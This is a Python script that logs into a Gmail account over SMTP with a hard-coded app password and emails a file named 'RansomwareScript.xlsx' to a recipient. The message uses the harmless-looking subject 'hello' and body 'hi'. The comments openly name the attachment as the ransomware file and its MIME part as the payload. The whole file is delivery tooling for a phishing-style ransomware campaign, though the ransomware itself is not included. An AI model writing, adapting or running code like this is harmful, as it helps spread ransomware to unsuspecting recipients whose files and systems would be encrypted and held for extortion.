
import smtplib,ssl
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import formatdate
from email import encoders
email_sender= 'ENTER THE SENDER EMAIL'
#email_sender password, password be smth like this go through this video to get the password https://www.youtube.com/watch?v=g_j6ILT-X0k
email_password='fsofndsojgnfsjgoignrwoi'
email_reciever= 'ENTER RECIPIENT'

def send_mail(send_from,send_to,subject,text,username,password):
    msg = MIMEMultipart()
    msg['From'] = send_from
    msg['To'] = send_to
    msg['Date'] = formatdate(localtime = True)
    msg['Subject'] = subject
    msg.attach(MIMEText(text))

    #create application Payload
    part = MIMEBase('application', "octet-stream")
    #specify location of the ransomware file and put it into part
    part.set_payload(open("RansomwareScript.xlsx", "rb").read())
    #encode this shit
    encoders.encode_base64(part)
    #repeat the name of the attachment as header
    part.add_header('Content-Disposition', 'attachment; filename="RansomwareScript.xlsx"')
    #attach it to the message
    msg.attach(part)

    context = ssl.create_default_context()
    #SSL connection only working on Python 3+

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(username,password)
        smtp.sendmail(email_sender, email_reciever, msg.as_string())


send_mail(email_sender,email_reciever,'hello','hi',email_sender,email_password)
